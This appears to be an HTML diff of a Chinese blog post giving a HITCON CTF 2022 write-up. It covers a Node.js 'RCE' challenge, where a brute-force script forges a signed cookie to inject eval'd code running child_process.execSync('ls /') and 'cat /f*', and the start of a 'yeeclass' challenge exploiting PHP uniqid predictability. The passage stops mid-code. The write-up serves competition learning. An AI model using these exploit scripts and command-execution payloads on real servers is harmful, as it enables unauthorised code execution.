@@ -1,0 +1,1697 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Writeup of HITCONCTF2022'>
+<title>[Hitcon2022] WriteUP</title>
+
+<link rel='canonical' href='https://blog.huamang.xyz/post/hitcon2022/'>
+
+<link rel="stylesheet" href="/scss/style.min.a3acb339192261971279929bada446e8966aa7224703ebfd992d05448daed96b.css"><meta property='og:title' content='[Hitcon2022] WriteUP'>
+<meta property='og:description' content='Writeup of HITCONCTF2022'>
+<meta property='og:url' content='https://blog.huamang.xyz/post/hitcon2022/'>
+<meta property='og:site_name' content='Huamang'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-11-28T13:12:42&#43;08:00'/><meta property='article:modified_time' content='2022-11-28T13:12:42&#43;08:00'/>
+<meta name="twitter:title" content="[Hitcon2022] WriteUP">
+<meta name="twitter:description" content="Writeup of HITCONCTF2022">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu2c79bb77476a4f0f53420443e9db5bfa_18691_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Huamang</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Huamang'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://blog.huamang.xyz/index.xml'
+                        target="_blank"
+                        title="RSS"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="5" cy="19" r="1" />
+  <path d="M4 4a16 16 0 0 1 16 16" />
+  <path d="M4 11a9 9 0 0 1 9 9" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/Huamang7'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/friends/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Friends</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#rce">RCE</a></li>
+    <li><a href="#yeeclass">yeeclass</a></li>
+    <li><a href="#web2pdf">web2pdf</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" style="background-color: #fc2828; color: #fff;">
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/hitcon2022/">[Hitcon2022] WriteUP</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Writeup of HITCONCTF2022
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Nov 28, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 8 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="rce">RCE</h1>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221128131359968.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221128131359968"
+	
+	
+></p>
+<p>是一个nodejs的站</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">const <span class="nv">express</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;express&#39;</span><span class="o">)</span><span class="p">;</span>
+const <span class="nv">cookieParser</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;cookie-parser&#39;</span><span class="o">)</span>
+const <span class="nv">crypto</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;crypto&#39;</span><span class="o">)</span><span class="p">;</span>
+
+const <span class="nv">randomHex</span> <span class="o">=</span> <span class="o">()</span> <span class="o">=</span>&gt; <span class="s1">&#39;0123456789abcdef&#39;</span><span class="o">[</span>~~<span class="o">(</span>Math.random<span class="o">()</span> * 16<span class="o">)]</span><span class="p">;</span>
+
+const <span class="nv">app</span> <span class="o">=</span> express<span class="o">()</span><span class="p">;</span>
+app.use<span class="o">(</span>cookieParser<span class="o">(</span>crypto.randomBytes<span class="o">(</span>20<span class="o">)</span>.toString<span class="o">(</span><span class="s1">&#39;hex&#39;</span><span class="o">)))</span><span class="p">;</span>
+
+app.get<span class="o">(</span><span class="s1">&#39;/&#39;</span>, <span class="k">function</span> <span class="o">(</span>_, res<span class="o">)</span> <span class="o">{</span>
+    res.cookie<span class="o">(</span><span class="s1">&#39;code&#39;</span>, <span class="s1">&#39;&#39;</span>, <span class="o">{</span> signed: <span class="nb">true</span> <span class="o">})</span>
+        .sendFile<span class="o">(</span>__dirname + <span class="s1">&#39;/index.html&#39;</span><span class="o">)</span><span class="p">;</span>
+<span class="o">})</span><span class="p">;</span>
+
+app.get<span class="o">(</span><span class="s1">&#39;/random&#39;</span>, <span class="k">function</span> <span class="o">(</span>req, res<span class="o">)</span> <span class="o">{</span>
+    <span class="nb">let</span> <span class="nv">result</span> <span class="o">=</span> null<span class="p">;</span>
+    <span class="k">if</span> <span class="o">(</span>req.signedCookies.code.length &gt;<span class="o">=</span> 40<span class="o">)</span> <span class="o">{</span>
+        const <span class="nv">code</span> <span class="o">=</span> Buffer.from<span class="o">(</span>req.signedCookies.code, <span class="s1">&#39;hex&#39;</span><span class="o">)</span>.toString<span class="o">()</span><span class="p">;</span>
+        try <span class="o">{</span>
+            <span class="nv">result</span> <span class="o">=</span> eval<span class="o">(</span>code<span class="o">)</span><span class="p">;</span>
+        <span class="o">}</span> catch <span class="o">{</span>
+            <span class="nv">result</span> <span class="o">=</span> <span class="s1">&#39;(execution error)&#39;</span><span class="p">;</span>
+        <span class="o">}</span>
+        res.cookie<span class="o">(</span><span class="s1">&#39;code&#39;</span>, <span class="s1">&#39;&#39;</span>, <span class="o">{</span> signed: <span class="nb">true</span> <span class="o">})</span>
+            .send<span class="o">({</span> progress: req.signedCookies.code.length, result: <span class="sb">`</span>Executing <span class="s1">&#39;${code}&#39;</span>, <span class="nv">result</span> <span class="o">=</span> <span class="si">${</span><span class="nv">result</span><span class="si">}</span><span class="sb">`</span> <span class="o">})</span><span class="p">;</span>
+    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+        res.cookie<span class="o">(</span><span class="s1">&#39;code&#39;</span>, req.signedCookies.code + randomHex<span class="o">()</span>, <span class="o">{</span> signed: <span class="nb">true</span> <span class="o">})</span>
+            .send<span class="o">({</span> progress: req.signedCookies.code.length, result <span class="o">})</span><span class="p">;</span>
+    <span class="o">}</span>
+<span class="o">})</span><span class="p">;</span>
+
+app.listen<span class="o">(</span>5000<span class="o">)</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>搜了一下这几个库的东西，好像得伪造一下cookie，但是这里有个40位字符的key而且是随机的</p>
+<p><a class="link" href="https://blog.51cto.com/u_15351164/3744594"  target="_blank" rel="noopener"
+    >https://blog.51cto.com/u_15351164/3744594</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">cookieParser<span class="o">(</span>crypto.randomBytes<span class="o">(</span>20<span class="o">)</span>.toString<span class="o">(</span><span class="s1">&#39;hex&#39;</span><span class="o">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>cookie的内容就是划线区域</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221128131422996.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221128131422996"
+	
+	
+></p>
+<p>但是必须得伪造出cookie，这里crypto.randomBytes(20)，20位任意字节，太大了无法爆破</p>
+<p>这里注意到的点是，这里会生成一次cookie为空的情况</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">res.cookie<span class="o">(</span><span class="s1">&#39;code&#39;</span>, <span class="s1">&#39;&#39;</span>, <span class="o">{</span> signed: <span class="nb">true</span> <span class="o">})</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>一开始想从加密算法去入手</p>
+<p><a class="link" href="https://github.com/tj/node-cookie-signature"  target="_blank" rel="noopener"
+    >https://github.com/tj/node-cookie-signature</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">exports.sign <span class="o">=</span> <span class="k">function</span><span class="o">(</span>val, secret<span class="o">){</span>
+  <span class="k">if</span> <span class="o">(</span><span class="s1">&#39;string&#39;</span> !<span class="o">=</span> typeof val<span class="o">)</span> throw new TypeError<span class="o">(</span><span class="s2">&#34;Cookie value must be provided as a string.&#34;</span><span class="o">)</span><span class="p">;</span>
+  <span class="k">if</span> <span class="o">(</span><span class="nv">null</span> <span class="o">==</span> secret<span class="o">)</span> throw new TypeError<span class="o">(</span><span class="s2">&#34;Secret key must be provided.&#34;</span><span class="o">)</span><span class="p">;</span>
+  <span class="k">return</span> val + <span class="s1">&#39;.&#39;</span> + crypto
+    .createHmac<span class="o">(</span><span class="s1">&#39;sha256&#39;</span>, secret<span class="o">)</span>
+    .update<span class="o">(</span>val<span class="o">)</span>
+    .digest<span class="o">(</span><span class="s1">&#39;base64&#39;</span><span class="o">)</span>
+    .replace<span class="o">(</span>/<span class="se">\\</span><span class="o">=</span>+$/, <span class="s1">&#39;&#39;</span><span class="o">)</span><span class="p">;</span>
+<span class="o">}</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>但是加密是sha256，所以也无从下手</p>
+<p>第二天起床反应过来，这里每次发包，如果cookie的长度不超过40，cookie的code会添加一位，这样的话我们就可以用这样的思路去爆破了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">import requests
+
+<span class="nv">url</span> <span class="o">=</span> <span class="s1">&#39;&lt;http://2egu5b5nyz.rce.chal.hitconctf.com/random&gt;&#39;</span>
+<span class="nv">cookie</span> <span class="o">=</span> <span class="s1">&#39;code=s%3A.lkOgjW%2FVqOIAtn7wop35cEZILLF22tanc72cCCT4aEQ&#39;</span>
+<span class="nv">rce</span> <span class="o">=</span> <span class="s1">&#39;7265717569726528226368696c645f70726f6365737322292e6578656353796e6328276c73202f2729&#39;</span>
+
+<span class="k">for</span> i in range<span class="o">(</span>len<span class="o">(</span>rce<span class="o">))</span>:
+    <span class="k">while</span> True:
+        <span class="nv">headers</span> <span class="o">=</span> <span class="o">{</span>
+            <span class="s2">&#34;Cookie&#34;</span>:<span class="s2">&#34;{}&#34;</span>.format<span class="o">(</span>cookie<span class="o">)</span>
+        <span class="o">}</span>
+
+        <span class="nv">res</span> <span class="o">=</span> requests.get<span class="o">(</span><span class="nv">url</span><span class="o">=</span>url,headers<span class="o">=</span>headers,proxies<span class="o">={</span><span class="s1">&#39;http&#39;</span>:<span class="s1">&#39;127.0.0.1:8080&#39;</span><span class="o">})</span>.headers<span class="o">[</span><span class="s1">&#39;set-cookie&#39;</span><span class="o">]</span>
+        <span class="nv">tmp1</span> <span class="o">=</span> res.split<span class="o">(</span><span class="s1">&#39;;&#39;</span><span class="o">)[</span>0<span class="o">]</span>
+        <span class="nv">tmp2</span> <span class="o">=</span> tmp1.split<span class="o">(</span><span class="s1">&#39;%3A&#39;</span><span class="o">)[</span>1<span class="o">]</span>
+        <span class="k">if</span> tmp2<span class="o">[</span>i<span class="o">]==</span>rce<span class="o">[</span>i<span class="o">]</span>:
+            <span class="nv">cookie</span> <span class="o">=</span> tmp1
+            <span class="nb">break</span>
+    print<span class="o">(</span>cookie<span class="o">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>但是问题来了，只能限制20位长度的nodejs代码执行，这里我利用的是req.query来绕过的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">eval<span class="o">(</span>req.query.aaaa<span class="o">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>然后生成hex来爆破</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">import requests
+
+<span class="nv">url</span> <span class="o">=</span> <span class="s1">&#39;&lt;http://20mwdreh3f.rce.chal.hitconctf.com/random&gt;&#39;</span>
+<span class="nv">cookie</span> <span class="o">=</span> <span class="s1">&#39;code=s%3A.31ky65OqgvqXGw0%2FJFIPoKHr2dLSC6%2Bg%2F%2BpzdEVZXJA&#39;</span>
+<span class="nv">rce</span> <span class="o">=</span> <span class="s1">&#39;6576616c287265712e71756572792e6161616129&#39;</span>
+
+<span class="k">for</span> i in range<span class="o">(</span>len<span class="o">(</span>rce<span class="o">))</span>:
+    <span class="k">while</span> True:
+        <span class="nv">headers</span> <span class="o">=</span> <span class="o">{</span>
+            <span class="s2">&#34;Cookie&#34;</span>:<span class="s2">&#34;{}&#34;</span>.format<span class="o">(</span>cookie<span class="o">)</span>
+        <span class="o">}</span>
+
+        <span class="nv">res</span> <span class="o">=</span> requests.get<span class="o">(</span><span class="nv">url</span><span class="o">=</span>url,headers<span class="o">=</span>headers,proxies<span class="o">={</span><span class="s1">&#39;http&#39;</span>:<span class="s1">&#39;127.0.0.1:8080&#39;</span><span class="o">})</span>.headers<span class="o">[</span><span class="s1">&#39;set-cookie&#39;</span><span class="o">]</span>
+        <span class="nv">tmp1</span> <span class="o">=</span> res.split<span class="o">(</span><span class="s1">&#39;;&#39;</span><span class="o">)[</span>0<span class="o">]</span>
+        <span class="nv">tmp2</span> <span class="o">=</span> tmp1.split<span class="o">(</span><span class="s1">&#39;%3A&#39;</span><span class="o">)[</span>1<span class="o">]</span>
+        <span class="k">if</span> tmp2<span class="o">[</span>i<span class="o">]==</span>rce<span class="o">[</span>i<span class="o">]</span>:
+            <span class="nv">cookie</span> <span class="o">=</span> tmp1
+            <span class="nb">break</span>
+    print<span class="o">(</span>cookie<span class="o">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://tuchuang.huamang.xyz/img/image-20221128131552792.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221128131552792"
+	
+	
+></p>
+<p>当然也可以多次执行命令来做，但是不够优雅hhh</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">a=require
+b=a(&#34;child_process&#34;)
+c=b.execSync
+c(&#34;cat /f*&#34;)
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="yeeclass">yeeclass</h1>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221128131647434.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221128131647434"
+	
+	
+></p>
+<p>flag在数据库中，在init.php里面被插入进submission</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221128131735574.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221128131735574"
+	
+	
+></p>
+<p>随便登录一个号进去，可以进入submission页面，这里根据id来进行submission的展示</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221128131811083.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221128131811083"
+	
+	
+></p>
+<p>可以肯定的是，这里获取flag最后肯定得走这里，要求传入的hash和数据库的相等则展示</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221128131824404.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221128131824404"
+	
+	
+></p>
+<p>而存放了flag的hash，是一个由uniqid函数生成的随机字符串</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221128131842196.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>直接看uniqid源码</p>
+<p><a class="link" href="https://github.com/php/php-src/blob/c8aa6f3a9a3d2c114d0c5e0c9fdd0a465dbb54a5/ext/standard/uniqid.c"  target="_blank" rel="noopener"
+    >https://github.com/php/php-src/blob/c8aa6f3a9a3d2c114d0c5e0c9fdd0a465dbb54a5/ext/standard/uniqid.c</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">PHP_FUNCTION<span class="o">(</span>uniqid<span class="o">)</span>
+<span class="o">{</span>
+    ...
+	gettimeofday<span class="o">((</span>struct timeval *<span class="o">)</span> <span class="p">&amp;</span>tv, <span class="o">(</span>struct timezone *<span class="o">)</span> NULL<span class="o">)</span><span class="p">;</span>
+	<span class="nv">sec</span> <span class="o">=</span> <span class="o">(</span>int<span class="o">)</span> tv.tv_sec<span class="p">;</span>
+	<span class="nv">usec</span> <span class="o">=</span> <span class="o">(</span>int<span class="o">)</span> <span class="o">(</span>tv.tv_usec % 0x100000<span class="o">)</span><span class="p">;</span>
+
+    ...
+	<span class="k">if</span> <span class="o">(</span>more_entropy<span class="o">)</span> <span class="o">{</span>
